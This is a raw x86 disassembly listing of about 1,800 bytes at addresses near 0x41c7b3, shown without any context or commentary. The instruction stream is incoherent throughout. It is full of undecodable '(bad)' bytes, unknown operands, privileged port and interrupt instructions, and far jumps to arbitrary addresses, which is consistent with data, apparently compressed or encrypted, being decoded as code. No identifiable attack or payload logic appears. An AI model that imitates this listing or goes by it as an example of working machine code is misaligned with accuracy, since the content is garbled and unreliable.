  41c7b3:	cli    
  41c7b4:	test   al,0xff
  41c7b6:	sahf   
  41c7b7:	sub    edx,DWORD PTR [ecx-0x71]
  41c7ba:	(bad)  
  41c7bb:	push   ecx
  41c7bc:	cmc    
  41c7bd:	cs rcl ch,cl
  41c7c0:	mov    bh,0xba
  41c7c2:	sub    al,0xdf
  41c7c4:	fsubr  st(0),st
  41c7c6:	ret    
  41c7c7:	(bad)  
  41c7c8:	lds    edi,FWORD PTR [esp+ebp*2]
  41c7cb:	cwde   
  41c7cc:	out    dx,al
  41c7cd:	cmp    edx,DWORD PTR [esi+0x5f]
  41c7d0:	jmp    0x41c7ab
  41c7d2:	cs xchg ebp,eax
  41c7d4:	mov    bl,0x7d
  41c7d6:	rol    BYTE PTR ss:[edi],cl
  41c7d9:	loopne 0x41c79c
  41c7db:	mov    eax,0x8bdc752
  41c7e0:	test   DWORD PTR [eax-0x191dfd36],esi
  41c7e6:	ins    BYTE PTR es:[edi],dx
  41c7e7:	fdivr  st(2),st
  41c7e9:	pop    edi
  41c7ea:	fwait
  41c7eb:	pop    edi
  41c7ec:	sbb    edi,ebx
  41c7ee:	inc    edi
  41c7ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7f0:	gs loopne 0x41c83b
  41c7f3:	sbb    al,0xe2
  41c7f5:	lods   al,BYTE PTR ds:[esi]
  41c7f6:	inc    dh
  41c7f8:	xlat   BYTE PTR ds:[ebx]
  41c7f9:	das    
  41c7fa:	push   ebp
  41c7fb:	mov    DWORD PTR [ecx-0x28],edx
  41c7fe:	cld    
  41c7ff:	enter  0x4526,0x88
  41c803:	xchg   edi,eax
  41c804:	ret    0xe1a2
  41c807:	(bad)  
  41c808:	leave  
  41c809:	sbb    cl,bl
  41c80b:	cld    
  41c80c:	mov    cl,0xe4
  41c80e:	sbb    al,0xa0
  41c810:	jmp    0x41c80d
  41c812:	mov    ah,0x76
  41c814:	xchg   sp,ax
  41c816:	test   DWORD PTR [eax],edi
  41c818:	ins    DWORD PTR es:[edi],dx
  41c819:	(bad)  
  41c81b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c81c:	and    eax,DWORD PTR [ebx+ebp*2]
  41c81f:	js     0x41c861
  41c821:	xor    dh,dh
  41c823:	retf   0xcaee
  41c826:	bound  edx,QWORD PTR [ecx+0x22]
  41c829:	ffreep st(7)
  41c82b:	daa    
  41c82c:	nop
  41c82d:	(bad)  [ebx-0x38]
  41c830:	imul   DWORD PTR [ebx+0x2f35c343]
  41c836:	(bad)  
  41c837:	and    edi,edi
  41c839:	je     0x41c8a7
  41c83b:	fsubr  QWORD PTR [ebx-0x7243812]
  41c841:	sbb    ecx,DWORD PTR [edi-0x38]
  41c844:	jecxz  0x41c7d3
  41c846:	push   es
  41c847:	mov    BYTE PTR [eax-0x141b1247],al
  41c84d:	mov    bl,0xc6
  41c84f:	cdq    
  41c850:	stos   BYTE PTR es:[edi],al
  41c851:	arpl   WORD PTR [esp],si
  41c854:	adc    al,0xe8
  41c856:	sbb    edx,DWORD PTR ds:0x89a89f50
  41c85c:	adc    BYTE PTR [ebx-0x65fff015],bl
  41c862:	jne    0x41c8d7
  41c864:	call   0x2b8c7c01
  41c869:	mov    ebx,0xdff37ff1
  41c86e:	ret    0xe8d
  41c871:	sub    ebp,DWORD PTR [eax-0x6b]
  41c874:	daa    
  41c875:	call   0xe41aa06c
  41c87a:	pop    edi
  41c87b:	dec    eax
  41c87c:	inc    edi
  41c87d:	xor    cl,BYTE PTR [esi+0x1f]
  41c880:	mov    eax,0xa0f73ddf
  41c885:	std    
  41c886:	mov    al,BYTE PTR [edi-0x4d007e1e]
  41c88c:	sub    dh,BYTE PTR [esi]
  41c88e:	pop    es
  41c88f:	adc    ebp,esi
  41c891:	pop    edi
  41c892:	lods   al,BYTE PTR ds:[esi]
  41c893:	pop    eax
  41c894:	jp     0x41c8b9
  41c896:	cli    
  41c897:	mov    ebp,0x48738449
  41c89c:	imul   eax,DWORD PTR [edx-0x6be35156],0xfffffff9
  41c8a3:	inc    esi
  41c8a4:	mov    ?,WORD PTR [ecx-0x37]
  41c8a7:	and    ch,ah
  41c8a9:	sbb    esi,ebp
  41c8ab:	or     BYTE PTR [edx],bh
  41c8ad:	shl    BYTE PTR [eax-0x6f20cdd0],0x89
  41c8b4:	nop
  41c8b5:	mov    ecx,ebx
  41c8b7:	xor    esi,esp
  41c8b9:	jo     0x41c8e5
  41c8bb:	repz jmp 0x41c890
  41c8be:	or     BYTE PTR [ecx],bl
  41c8c0:	sbb    eax,0x69bf7348
  41c8c5:	loopne 0x41c85e
  41c8c7:	push   es
  41c8c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8c9:	ret    0xc87b
  41c8cc:	mov    esp,0xeba32089
  41c8d1:	(bad)  
  41c8d2:	cdq    
  41c8d3:	push   esi
  41c8d4:	inc    esp
  41c8d5:	pop    edx
  41c8d6:	(bad)  
  41c8d7:	out    0x90,eax
  41c8d9:	fild   WORD PTR [ebp+esi*2+0x5a]
  41c8dd:	xor    esp,esi
  41c8df:	jl     0x41c88f
  41c8e1:	hlt    
  41c8e2:	sahf   
  41c8e3:	jno    0x41c8d0
  41c8e5:	test   eax,0x6229ece6
  41c8ea:	xchg   ecx,eax
  41c8eb:	ret    
  41c8ec:	sbb    ebx,ecx
  41c8ee:	push   edi
  41c8ef:	dec    ecx
  41c8f0:	sbb    eax,0x51623d34
  41c8f5:	outs   dx,BYTE PTR ds:[esi]
  41c8f6:	dec    esi
  41c8f7:	clc    
  41c8f8:	jmp    0xb622:0x7a169ebb
  41c8ff:	enter  0xc3f,0xdd
  41c903:	mov    cl,BYTE PTR [ebp+ebp*2+0x5eb0195]
  41c90a:	cmp    dl,dh
  41c90c:	fisttp DWORD PTR [di+0xfff]
  41c911:	(bad)  
  41c913:	stos   BYTE PTR es:[edi],al
  41c914:	shl    dh,0xaa
  41c917:	mov    al,0x8d
  41c919:	(bad)  
  41c91a:	stc    
  41c91b:	pop    es
  41c91c:	call   0xbecf:0x2b81182e
  41c923:	mov    esi,0xa892df94
  41c928:	imul   esp,DWORD PTR [esi],0xffffffe8
  41c92b:	jnp    0x41c96f
  41c92d:	fs aad 0xf3
  41c930:	ss (bad) 
  41c932:	std    
  41c933:	outs   dx,DWORD PTR ds:[esi]
  41c934:	sub    DWORD PTR [edi+ecx*1+0xd],esi
  41c938:	int    0xe6
  41c93a:	leave  
  41c93b:	enter  0xc7be,0x93
  41c93f:	fidiv  WORD PTR [edx]
  41c941:	das    
  41c942:	xor    al,0x38
  41c944:	jmp    0x41c98d
  41c946:	pop    ds
  41c947:	imul   edx,DWORD PTR [ecx-0x5a9c56f1],0x6fb0d8df
  41c951:	stos   BYTE PTR es:[edi],al
  41c952:	mov    ch,0x40
  41c954:	popa   
  41c955:	dec    eax
  41c956:	repz lahf 
  41c958:	dec    edi
  41c959:	cs icebp 
  41c95b:	stc    
  41c95c:	jmp    0x41c964
  41c95e:	xor    esi,DWORD PTR [ebx+esi*1-0x6b]
  41c962:	sub    al,0xc8
  41c964:	or     DWORD PTR [esi],0x4d38cae
  41c96a:	xor    al,0x48
  41c96c:	jmp    0x41c9ad
  41c96e:	test   DWORD PTR [edi+ebp*2+0x2aba41bc],edx
  41c975:	(bad)  
  41c977:	das    
  41c978:	dec    DWORD PTR [edx+ecx*4-0x2d5ce23]
  41c97f:	dec    esp
  41c980:	mov    ebx,0xcf3a3192
  41c985:	cmp    dh,ch
  41c987:	enter  0x11cc,0xa5
  41c98b:	push   eax
  41c98c:	stc    
  41c98d:	fcom   st(4)
  41c98f:	and    ebp,DWORD PTR [eax-0x4efa17a3]
  41c995:	out    0x8a,eax
  41c997:	and    edi,DWORD PTR [edi+0x64]
  41c99a:	push   esi
  41c99b:	shl    BYTE PTR [esi],0x87
  41c99e:	mov    ch,0x86
  41c9a0:	out    0xd7,eax
  41c9a2:	sti    
  41c9a3:	xchg   esp,eax
  41c9a4:	std    
  41c9a5:	fisub  WORD PTR [esi+0x31]
  41c9a8:	sub    esi,DWORD PTR [ebx-0x26f7f338]
  41c9ae:	fldpi  
  41c9b0:	mov    ds:0x99b35d54,al
  41c9b5:	mov    dh,0x29
  41c9b7:	js     0x41c9a4
  41c9b9:	xchg   ebp,eax
  41c9ba:	mov    BYTE PTR [ebx],ah
  41c9bc:	jge    0x41c97a
  41c9be:	aas    
  41c9bf:	out    0x46,al
  41c9c1:	(bad)  
  41c9c3:	pop    es
  41c9c4:	(bad)  
  41c9c5:	retf   
  41c9c6:	scas   eax,DWORD PTR es:[edi]
  41c9c7:	sbb    DWORD PTR [eax-0x17e90b87],esp
  41c9cd:	xchg   BYTE PTR [ebx+0x2e5f617c],cl
  41c9d3:	mov    ebx,0xb78d0723
  41c9d8:	imul   ebp,DWORD PTR [ebx-0x63131858],0xc
  41c9df:	push   ds
  41c9e0:	mov    esp,0x5b0779eb
  41c9e5:	jecxz  0x41c96b
  41c9e7:	fsub   st,st(6)
  41c9e9:	mov    ds:0xb65d58f7,al
  41c9ee:	ins    BYTE PTR es:[edi],dx
  41c9ef:	pop    edx
  41c9f0:	mov    cl,0x66
  41c9f2:	push   0x79008fce
  41c9f7:	lods   al,BYTE PTR gs:[esi]
  41c9f9:	gs adc ch,al
  41c9fc:	mov    DWORD PTR [edi],esp
  41c9fe:	dec    dh
  41ca00:	jmp    0x41ca22
  41ca02:	add    edx,DWORD PTR [ebx+eax*4+0x2c]
  41ca06:	popa   
  41ca07:	jl     0x41ca34
  41ca09:	dec    ebx
  41ca0a:	and    eax,0x4fdfea16
  41ca0f:	repz fcmovnu st,st(6)
  41ca12:	sbb    BYTE PTR [ecx+0x5b],ah
  41ca15:	mov    bh,ch
  41ca17:	jecxz  0x41ca18
  41ca19:	push   edi
  41ca1b:	mov    dl,0xe7
  41ca1d:	mov    eax,ds:0x1afa90b7
  41ca22:	std    
  41ca23:	add    esp,DWORD PTR [esi]
  41ca25:	sti    
  41ca26:	jge    0x41ca80
  41ca28:	jge    0x41c9ea
  41ca2a:	cld    
  41ca2b:	jbe    0x41ca9f
  41ca2d:	in     eax,0x91
  41ca2f:	call   0xcb81220b
  41ca34:	push   ebx
  41ca35:	sar    DWORD PTR [eax],cl
  41ca37:	retf   0xe305
  41ca3a:	fwait
  41ca3b:	sti    
  41ca3c:	mov    bh,0xa0
  41ca3e:	mov    esi,0x19e82ba6
  41ca43:	pop    ebp
  41ca44:	jmp    0xc5dc:0xde288599
  41ca4b:	pop    eax
  41ca4c:	lea    ebx,[esp+edx*2]
  41ca4f:	enter  0x6735,0xac
  41ca53:	jg     0x41ca76
  41ca55:	rol    DWORD PTR ds:0xe10feb4f,cl
  41ca5b:	and    BYTE PTR [ecx+0x9],dl
  41ca5e:	mov    WORD PTR [edx+0x50],ss
  41ca61:	aaa    
  41ca62:	or     eax,0x724c74c8
  41ca67:	aam    0xad
  41ca69:	fimul  DWORD PTR [edx-0x1a]
  41ca6c:	jmp    0x41cac6
  41ca6e:	daa    
  41ca6f:	push   0x33
  41ca71:	jo     0x41cace
  41ca73:	nop
  41ca74:	inc    ebx
  41ca75:	fbstp  TBYTE PTR [ecx]
  41ca77:	mov    BYTE PTR [ebp+0x24],bl
  41ca7a:	xchg   esi,eax
  41ca7b:	fcmove st,st(6)
  41ca7d:	(bad)  
  41ca7e:	cld    
  41ca7f:	in     eax,0xb4
  41ca81:	xor    BYTE PTR [edx+0x3c6ffa06],0xc8
  41ca88:	jge    0x41ca7c
  41ca8a:	add    DWORD PTR [edi],edx
  41ca8c:	loop   0x41cacb
  41ca8e:	mov    ds:0x1b8ce654,al
  41ca93:	es mov edi,0x5e790f25
  41ca99:	mov    esp,0xbd4c3084
  41ca9e:	call   0x59db8e6a
  41caa3:	call   0x75760b12
  41caa8:	jmp    0x41ca5f
  41caaa:	xchg   ecx,eax
  41caab:	movd   mm2,DWORD PTR [edx]
  41caae:	pop    esi
  41caaf:	adc    ah,ah
  41cab1:	fistp  QWORD PTR [edx-0x6d]
  41cab4:	push   ebx
  41cab5:	adc    dh,0x3a
  41cab8:	mov    al,ds:0xb6ccece9
  41cabd:	inc    ecx
  41cabe:	clc    
  41cabf:	dec    edx
  41cac0:	add    BYTE PTR [edi-0x437f3869],0xb5
  41cac7:	jl     0x41cae4
  41cac9:	outs   dx,DWORD PTR ds:[esi]
  41caca:	int    0xf4
  41cacc:	xchg   BYTE PTR [ebp+0x1b427afc],dl
  41cad2:	fucomi st,st(0)
  41cad4:	jne    0x41ca89
  41cad6:	ins    DWORD PTR es:[edi],dx
  41cad7:	enter  0xc59f,0xc9
  41cadb:	pop    ebx
  41cadc:	and    al,0x41
  41cade:	sbb    edx,DWORD PTR [ecx+0x404630eb]
  41cae4:	retf   0x831a
  41cae7:	gs (bad) 
  41cae9:	push   ebx
  41caea:	bound  edi,QWORD PTR [esi+ebx*8+0x7f4871ac]
  41caf1:	inc    esp
  41caf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caf3:	sub    ah,bl
  41caf5:	cli    
  41caf6:	in     eax,0x4d
  41caf8:	inc    ecx
  41caf9:	pop    esp
  41cafa:	(bad)  
  41cafb:	xor    eax,esp
  41cafd:	xchg   ebp,eax
  41cafe:	fimul  DWORD PTR [edi]
  41cb00:	mov    ebp,0x48c83c0f
  41cb05:	sti    
  41cb06:	arpl   dx,cx
  41cb08:	hlt    
  41cb09:	retf   
  41cb0a:	or     eax,0x8290eb82
  41cb0f:	mov    al,0xe6
  41cb11:	sub    eax,DWORD PTR [ecx-0x4120d21e]
  41cb17:	lock std 
  41cb19:	stc    
  41cb1a:	sub    cl,BYTE PTR [ebp+edx*2+0x22]
  41cb1e:	xchg   ebp,eax
  41cb1f:	ds jmp 0x41caff
  41cb22:	pop    ecx
  41cb23:	iret   
  41cb24:	fldcw  WORD PTR fs:[ecx-0x2b209c51]
  41cb2b:	mov    esp,0x3b09e9e1
  41cb30:	inc    edx
  41cb31:	paddw  mm2,QWORD PTR [esi-0x73]
  41cb35:	xlat   BYTE PTR ds:[ebx]
  41cb36:	outs   dx,DWORD PTR ds:[esi]
  41cb37:	jle    0x41cb46
  41cb39:	cmp    ebp,DWORD PTR [ebp-0x29d9ed32]
  41cb3f:	pop    esp
  41cb40:	sbb    BYTE PTR [eax+edx*8-0x7857356c],0x74
  41cb48:	sbb    esp,DWORD PTR ds:0x50ec8a7a
  41cb4e:	add    ebp,0xffffffab
  41cb51:	mov    BYTE PTR [ecx+0x65572b27],bh
  41cb57:	enter  0x9486,0x32
  41cb5b:	and    ebx,DWORD PTR [ebx+0x27]
  41cb5e:	scas   al,BYTE PTR es:[edi]
  41cb5f:	adc    ebx,ebp
  41cb61:	enter  0x9106,0x20
  41cb65:	popf   
  41cb66:	adc    eax,0x6fdf510b
  41cb6b:	f2xm1  
  41cb6d:	adc    edx,edi
  41cb6f:	mov    esp,0x99b58a8
  41cb74:	jmp    0x7117:0xbde8f963
  41cb7b:	jo     0x41cb41
  41cb7d:	pop    ds
  41cb7e:	and    eax,0x41879c8
  41cb83:	and    eax,0xe4fee221
  41cb88:	jmp    0x41cbae
  41cb8a:	mul    DWORD PTR ds:0x72b027de
  41cb90:	in     al,0xe0
  41cb92:	sub    ch,BYTE PTR [ecx-0x65]
  41cb95:	xor    BYTE PTR [eax+0x38],ah
  41cb98:	sbb    eax,0x56399ce
  41cb9d:	dec    esi
  41cb9e:	add    dl,BYTE PTR [edx+0x207cd6a6]
  41cba4:	xor    DWORD PTR [ebx-0x20a8d4dd],0xffffffaf
  41cbab:	push   edx
  41cbad:	inc    ebp
  41cbae:	cdq    
  41cbaf:	out    dx,eax
  41cbb0:	fisttp WORD PTR [edi-0x3e73d03]
  41cbb6:	sbb    dh,bl
  41cbb8:	test   al,al
  41cbba:	pop    esi
  41cbbb:	enter  0x1da,0x58
  41cbbf:	pop    edx
  41cbc0:	or     al,0x11
  41cbc2:	scas   eax,DWORD PTR es:[edi]
  41cbc3:	sbb    al,0xeb
  41cbc5:	(bad)  
  41cbc7:	xor    DWORD PTR [edi+esi*4],edi
  41cbca:	div    ebp
  41cbcc:	scas   eax,DWORD PTR es:[edi]
  41cbcd:	fcomip st,st(6)
  41cbcf:	xchg   esp,eax
  41cbd0:	(bad)  
  41cbd1:	lods   eax,DWORD PTR ds:[esi]
  41cbd2:	add    eax,0x4d183714
  41cbd7:	jnp    0x41cc31
  41cbd9:	cmp    bh,ch
  41cbdb:	sahf   
  41cbdc:	xchg   esi,eax
  41cbdd:	(bad)  
  41cbde:	xlat   BYTE PTR ds:[ebx]
  41cbdf:	cmp    al,0xde
  41cbe1:	xchg   ah,al
  41cbe3:	enter  0xc518,0xc1
  41cbe7:	inc    ebp
  41cbe8:	(bad)  
  41cbea:	or     BYTE PTR [eax],cl
  41cbec:	in     al,dx
  41cbed:	out    dx,al
  41cbee:	push   ebx
  41cbef:	and    al,al
  41cbf1:	pushf  
  41cbf2:	sbb    ebp,DWORD PTR [eax+0xc]
  41cbf5:	je     0x41cbb5
  41cbf7:	or     bl,BYTE PTR [ebx]
  41cbf9:	mov    ch,0xac
  41cbfb:	sub    BYTE PTR [esi-0x22368621],ah
  41cc01:	jno    0x41cbd1
  41cc03:	jbe    0x41cbe8
  41cc05:	imul   edi,ebp,0x6b
  41cc08:	adc    cl,BYTE PTR [esi]
  41cc0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc0b:	pop    es
  41cc0c:	bound  ebx,QWORD PTR [eax]
  41cc0e:	vdivpd xmm2,xmm6,XMMWORD PTR [esi]
  41cc12:	test   eax,0x415140bd
  41cc17:	sub    BYTE PTR [edx-0x5ff75b5e],al
  41cc1d:	popa   
  41cc1e:	xor    DWORD PTR [edi+esi*4+0x2fc7e897],ecx
  41cc25:	inc    ebp
  41cc26:	and    BYTE PTR [esi-0x43],cl
  41cc29:	xor    edi,DWORD PTR [esi-0x139cb238]
  41cc2f:	pop    ebp
  41cc30:	lods   al,BYTE PTR ds:[esi]
  41cc31:	aam    0xba
  41cc33:	push   edi
  41cc34:	in     eax,dx
  41cc35:	inc    esi
  41cc36:	pop    eax
  41cc37:	(bad)  
  41cc38:	pop    ecx
  41cc39:	mov    BYTE PTR [ebp-0x49082271],bh
  41cc3f:	jbe    0x41cc85
  41cc41:	fbstp  TBYTE PTR [edx+eax*4-0x2b6c91eb]
  41cc48:	aam    0xdc
  41cc4a:	cld    
  41cc4b:	jecxz  0x41cc74
  41cc4d:	sbb    al,BYTE PTR [ebx]
  41cc4f:	les    ebx,FWORD PTR ds:0xf1ced372
  41cc55:	jnp    0x41cc56
  41cc57:	inc    edx
  41cc58:	retf   
  41cc59:	test   eax,esp
  41cc5b:	push   cs
  41cc5c:	push   cs
  41cc5d:	inc    ebx
  41cc5e:	in     eax,dx
  41cc5f:	(bad)  
  41cc62:	dec    ecx
  41cc63:	sti    
  41cc64:	xchg   ebp,eax
  41cc65:	fimul  WORD PTR [ecx]
  41cc67:	sub    edx,DWORD PTR [esi]
  41cc69:	jecxz  0x41ccda
  41cc6b:	mov    eax,DWORD PTR [ebx+0x4b]
  41cc6e:	sbb    DWORD PTR [eax+0x4c1e12eb],edi
  41cc74:	dec    ebx
  41cc75:	rcr    bl,0x4c
  41cc78:	and    edi,ebx
  41cc7a:	cdq    
  41cc7b:	fstp   DWORD PTR [ebx+0x6]
  41cc7e:	xchg   esi,eax
  41cc7f:	ss fs add bh,ch
  41cc83:	mov    ecx,0xb350e650
  41cc88:	mov    ds:0xa7c85979,al
  41cc8d:	rcl    BYTE PTR [edx],0xc2
  41cc90:	mov    al,ds:0xebee2e1e
  41cc95:	(bad)  
  41cc96:	pop    edx
  41cc97:	fstp   DWORD PTR [ebx]
  41cc99:	and    BYTE PTR [eax],bl
  41cc9b:	shr    al,cl
  41cc9d:	lds    eax,FWORD PTR [esi-0x434cc638]
  41cca3:	add    edx,DWORD PTR [ecx-0x14ece413]
  41cca9:	(bad)  
  41ccaa:	ins    BYTE PTR es:[edi],dx
  41ccab:	ins    DWORD PTR es:[edi],dx
  41ccac:	add    eax,DWORD PTR [ebp-0x2041eb3c]
  41ccb2:	mov    cl,0x68
  41ccb4:	inc    eax
  41ccb5:	(bad)  
  41ccb6:	mov    ch,0x9b
  41ccb8:	mov    ebx,ebx
  41ccba:	jecxz  0x41cd32
  41ccbc:	jae    0x41cd1d
  41ccbe:	jle    0x41cc5c
  41ccc0:	outs   dx,BYTE PTR ds:[esi]
  41ccc1:	lods   al,BYTE PTR cs:[esi]
  41ccc3:	daa    
  41ccc4:	adc    bl,bh
  41ccc6:	push   edi
  41ccc7:	cmp    BYTE PTR [ebx+0x3c],cl
  41ccca:	imul   esp,DWORD PTR [edx],0xffffffb9
  41cccd:	(bad)  
  41ccce:	sub    edx,DWORD PTR [esi-0xc02fb61]
  41ccd4:	mov    ds:0xb0723447,al
  41ccd9:	fsubr  DWORD PTR [esi-0x18f78435]
  41ccdf:	sahf   
  41cce0:	mov    dl,0xf5
  41cce2:	les    ebx,FWORD PTR [ebp+0x2e]
  41cce5:	xlat   BYTE PTR ds:[ebx]
  41cce6:	cld    
  41cce7:	xor    ch,al
  41cce9:	dec    edi
  41ccea:	mov    edx,0xf211d9f4
  41ccef:	(bad)  
  41ccf0:	or     eax,edx
  41ccf2:	sub    BYTE PTR [ecx],0xd1
  41ccf5:	adc    eax,0xe1ebe2f4
  41ccfa:	clc    
  41ccfb:	dec    esp
  41ccfc:	pop    edi
  41ccfd:	mov    ecx,0xa5a4ec5
  41cd02:	and    DWORD PTR [ecx-0x22],esi
  41cd05:	and    al,0xfd
  41cd07:	dec    esi
  41cd08:	sbb    DWORD PTR [edi],ecx
  41cd0a:	arpl   si,si
  41cd0c:	and    eax,0x4e1ffd87
  41cd11:	popf   
  41cd12:	lahf   
  41cd13:	mov    ah,0xf
  41cd15:	shl    BYTE PTR [edx-0x38],1
  41cd18:	cwde   
  41cd19:	loopne 0x41cd1f
  41cd1b:	mov    ?,esi
  41cd1d:	jmp    DWORD PTR [ebx+eiz*1]
  41cd20:	jmp    0x41cd1a
  41cd22:	dec    esi
  41cd23:	inc    edx
  41cd24:	or     al,0x5c
  41cd26:	mov    ?,WORD PTR [ebx+0x6c4ca757]
  41cd2c:	out    dx,al
  41cd2d:	cld    
  41cd2e:	sar    BYTE PTR ds:0x28b99c06,cl
  41cd34:	loope  0x41cda2
  41cd36:	into   
  41cd37:	pop    ebp
  41cd38:	jnp    0x41cd47
  41cd3a:	std    
  41cd3b:	push   0xa57c52a6
  41cd40:	push   ds
  41cd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd42:	test   eax,ebx
  41cd44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd45:	cwde   
  41cd46:	(bad)  
  41cd47:	ss and ebx,ebx
  41cd4a:	cld    
  41cd4b:	sbb    BYTE PTR [edi],ah
  41cd4d:	or     bh,BYTE PTR [eax]
  41cd4f:	dec    edi
  41cd50:	lds    ebp,FWORD PTR [edx-0x3ecd7f3a]
  41cd56:	sti    
  41cd57:	dec    esp
  41cd58:	add    al,0xd7
  41cd5a:	pop    ebp
  41cd5b:	or     bl,cl
  41cd5d:	clc    
  41cd5e:	sub    eax,0xdc8deb08
  41cd63:	push   ebp
  41cd64:	push   cs
  41cd65:	imul   edx,DWORD PTR [edx-0x26235ba5],0x9629ee7c
  41cd6f:	inc    edi
  41cd70:	or     esi,DWORD PTR [ebp+0x30]
  41cd73:	lods   eax,DWORD PTR ds:[esi]
  41cd74:	jmp    0x41cd95
  41cd76:	xchg   ebp,eax
  41cd77:	test   DWORD PTR [esi],edx
  41cd79:	mov    esp,0xdf53fb87
  41cd7e:	add    eax,ebx
  41cd80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd81:	push   ds
  41cd82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd83:	jge    0x41cd2a
  41cd85:	ret    
  41cd86:	repnz push edi
  41cd88:	lds    ecx,FWORD PTR [esi-0x37]
  41cd8b:	or     BYTE PTR [esi],ch
  41cd8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd8e:	mov    ds:0xacdfcba2,eax
  41cd93:	ss iret 
  41cd95:	(bad)  
  41cd96:	push   ds
  41cd97:	loop   0x41cdcf
  41cd99:	sbb    al,BYTE PTR [ecx]
  41cd9b:	ins    BYTE PTR es:[edi],dx
  41cd9c:	hlt    
  41cd9d:	push   esp
  41cd9e:	mov    ebp,0xb13680a6
  41cda3:	add    DWORD PTR [edx],eax
  41cda5:	fnstenv [eax+esi*8+0x17dcea69]
  41cdac:	mov    al,ds:0xee790be3
  41cdb1:	hlt    
  41cdb2:	les    ebx,FWORD PTR [edx+ecx*8-0x66320297]
  41cdb9:	mov    dl,0xc7
  41cdbb:	mov    bl,0xdc
  41cdbd:	loopne 0x41cdb5
  41cdbf:	pop    edx
  41cdc0:	(bad)  
  41cdc1:	adc    ch,BYTE PTR [edi+0xfcfba77]
  41cdc7:	popa   
  41cdc8:	rcr    DWORD PTR [ecx],1
  41cdca:	add    BYTE PTR [edx+0x7f7ce2c3],ah
  41cdd0:	stc    
  41cdd1:	pop    ss
  41cdd2:	shl    DWORD PTR [edx-0x26],cl
  41cdd5:	fild   WORD PTR [ebp+0x1246cfa3]
  41cddb:	out    0xd0,eax
  41cddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdde:	cld    
  41cddf:	scas   eax,DWORD PTR es:[edi]
  41cde0:	xor    BYTE PTR [ebx+edi*4],bh
  41cde3:	(bad)  
  41cde4:	loop   0x41cdf3
  41cde6:	adc    eax,ecx
  41cde8:	mov    cl,0xb6
  41cdea:	out    dx,eax
  41cdeb:	push   esi
  41cdec:	scas   eax,DWORD PTR es:[edi]
  41cded:	addr16 (bad) 
  41cdef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdf0:	jmp    0x41ce38
  41cdf2:	outs   dx,BYTE PTR ds:[esi]
  41cdf3:	mov    eax,0x8e3cad91
  41cdf8:	dec    ebx
  41cdf9:	fdivp  st(2),st
  41cdfb:	adc    DWORD PTR [ebx+0x730982b2],edi
  41ce01:	pop    ss
  41ce02:	xchg   edx,eax
  41ce03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce04:	jmp    0x41ce64
  41ce06:	mov    ch,BYTE PTR [edi]
  41ce08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce09:	mov    eax,0xdd183011
  41ce0e:	sub    ebp,ebp
  41ce10:	sbb    esi,DWORD PTR [ecx-0x5cf4b2d6]
  41ce16:	jae    0x41ce5c
  41ce18:	jmp    0x41ce84
  41ce1a:	inc    edi
  41ce1b:	pushf  
  41ce1c:	ficom  WORD PTR [esi-0x6c]
  41ce1f:	pop    edx
  41ce20:	int    0xdf
  41ce22:	cmp    esp,DWORD PTR [eax-0x1a]
  41ce25:	xchg   edx,eax
  41ce26:	mov    bl,0x80
  41ce28:	xchg   ebx,eax
  41ce29:	jp     0x41ce4e
  41ce2b:	jne    0x41ce16
  41ce2d:	push   ebp
  41ce2e:	ret    0xb364
  41ce31:	(bad)  
  41ce32:	jg     0x41ce3c
  41ce34:	jmp    0x6e20e0b8
  41ce39:	cmp    ah,dh
  41ce3b:	mov    ds:0x6d53c227,al
  41ce40:	addr16 inc esi
  41ce42:	clc    
  41ce43:	or     cl,ah
  41ce45:	lahf   
  41ce46:	outs   dx,BYTE PTR ds:[esi]
  41ce47:	xor    DWORD PTR [edx+0x27],ebx
  41ce4a:	stos   DWORD PTR es:[edi],eax
  41ce4b:	fsubr  st,st(3)
  41ce4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce4e:	xor    eax,DWORD PTR [edi+0x4898e1fe]
  41ce54:	iret   
  41ce55:	fucomip st,st(6)
  41ce57:	int3   
  41ce58:	jg     0x41ce86
  41ce5a:	mov    ds:0xfd22cab3,al
  41ce5f:	popa   
  41ce60:	and    edx,ecx
  41ce62:	inc    ebp
  41ce63:	xchg   edx,eax
  41ce64:	dec    ebx
  41ce65:	scas   eax,DWORD PTR es:[edi]
  41ce66:	sbb    al,cl
  41ce68:	rcr    BYTE PTR [ecx-0x70],0xd1
  41ce6c:	mov    ds:0xe7cffda2,eax
  41ce71:	dec    edx
  41ce72:	jb     0x41ce55
  41ce74:	push   edi
  41ce75:	inc    edi
  41ce76:	arpl   bx,cx
  41ce78:	jb     0x41ce77
  41ce7a:	xor    eax,0x95434ba2
  41ce7f:	por    mm2,QWORD PTR [ecx+ebp*8]
  41ce83:	xchg   DWORD PTR ds:0xb3a4be90,edi
  41ce89:	fistp  QWORD PTR [ebp+edi*2-0x50ca15c8]
  41ce90:	and    ebp,esp
  41ce92:	stc    
  41ce93:	test   edx,esi
  41ce95:	xchg   BYTE PTR [ebx-0x74],ah
  41ce98:	imul   edi,ecx,0xffffff8e
  41ce9b:	xchg   edx,eax
  41ce9c:	inc    BYTE PTR [ebx+0x62]
  41ce9f:	enter  0x2457,0x59
  41cea3:	xlat   BYTE PTR ds:[ebx]
  41cea4:	mov    bh,0xac
  41cea6:	jb     0x41ce90
  41cea8:	jmp    0x41ceeb
  41ceaa:	inc    edi
  41ceab:	mov    ecx,0xde0bf3c5
  41ceb0:	mov    dl,0xdf
  41ceb2:	push   0x92521d13
  41ceb7:	push   ss
  41ceb8:	call   0x28:0xeb489b0f
  41cebf:	xlat   BYTE PTR ds:[ebx]
  41cec0:	and    ecx,DWORD PTR ds:0x8fa07bd7
  41cec6:	fcmovb st,st(7)
  41cec8:	jbe    0x41ce72
